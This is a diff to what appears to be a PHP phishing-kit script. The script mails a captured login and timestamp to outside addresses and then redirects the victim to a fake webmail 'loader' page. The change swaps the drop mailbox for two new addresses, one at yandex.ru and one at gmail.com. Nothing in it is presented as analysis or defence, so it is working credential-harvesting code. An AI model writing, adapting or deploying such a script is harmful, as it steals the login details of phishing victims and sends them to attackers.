@@ -23,7 +23,7 @@ $message.= "Time Log  : ".$time."\n";
 $domain = 'RMG';
 $subj = "Billions EN | $login";
 $from = "From: $domain<west>\n";
-mail("unileverspam@gmail.com",$subj,$message,$from,$domain);
+mail("tktren007@yandex.ru,habarova.yoot@gmail.com",$subj,$message,$from,$domain);
 
 header("Location: loader.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
 ?>
